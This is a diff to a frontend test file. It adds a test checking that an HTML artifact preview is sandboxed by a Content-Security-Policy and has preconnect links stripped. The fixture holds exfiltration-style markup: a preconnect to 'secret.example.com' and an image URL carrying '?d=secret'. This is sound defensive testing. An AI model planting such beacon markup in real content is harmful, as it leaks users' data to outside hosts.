@@ -60,6 +60,7 @@ const ARTIFACTS = Array.from({ length: 5 }, (_, i) => ({
 }));
 
 let artifactFetchError = false;
+let extraArtifacts: typeof ARTIFACTS = [];
 let artifactRequestDelay: Promise<void> | null = null;
 
 vi.mock("@/lib/api", () => ({
@@ -106,7 +107,7 @@ vi.mock("@/lib/api", () => ({
       const url = new URL(`http://x${path}`);
       const source = url.searchParams.get("source");
       const q = url.searchParams.get("q")?.toLowerCase();
-      let data = ARTIFACTS;
+      let data = [...ARTIFACTS, ...extraArtifacts];
       if (source) data = data.filter((a) => a.source === source);
       if (q)
         data = data.filter(
@@ -188,12 +189,14 @@ vi.mock("@/components/ui/use-toast", () => ({
 
 import { BrainSection, resetBrainViewStateForTests } from "../brain-section";
 import { localFetch } from "@/lib/api";
+import { commands } from "@/lib/utils/tauri";
 import { emit } from "@tauri-apps/api/event";
 import { useChatStore } from "@/lib/stores/chat-store";
 
 beforeEach(() => {
   vi.clearAllMocks();
   artifactFetchError = false;
+  extraArtifacts = [];
   artifactRequestDelay = null;
   eventMocks.listeners.clear();
   resetBrainViewStateForTests();
@@ -354,6 +357,34 @@ describe("BrainSection type filter", () => {
     } finally {
       now.mockRestore();
     }
+  });
+
+  it("previews a pipe's HTML artifact in a frame that cannot load remote images", async () => {
+    extraArtifacts = [{ ...ARTIFACTS[1], title: "report.html", kind: "html", path: "/tmp/pipes/glob-pipe/output/report.html" }];
+    vi.mocked(commands.readViewerFile).mockResolvedValue({
+      status: "ok",
+      data: {
+        kind: "text",
+        text: '<link rel="preconnect" href="https://secret.example.com"><p>report</p><img src="https://example.com/x.png?d=secret">',
+      },
+    } as never);
+    render(<BrainSection />);
+    await waitFor(() => expect(memoryRows().length).toBeGreaterThan(0));
+
+    selectBrainView("artifacts");
+
+    const frame = await waitFor(() => {
+      const element = document.querySelector("iframe");
+      if (!element) throw new Error("no preview frame yet");
+      return element;
+    });
+    const html = frame.getAttribute("srcdoc") ?? "";
+    // The policy comes first, so it governs everything the artifact loads.
+    expect(html).toMatch(/^<meta http-equiv="Content-Security-Policy" content="[^"]*\bimg-src data:[^"]*">/);
+    expect(html).toContain("default-src 'none'");
+    expect(html).toContain('<img src="https://example.com/x.png?d=secret">');
+    // WebKit connects to a preconnect host even under the policy.
+    expect(html).not.toContain("secret.example.com");
   });
 
   it("artifacts tab hides every memory row", async () => {
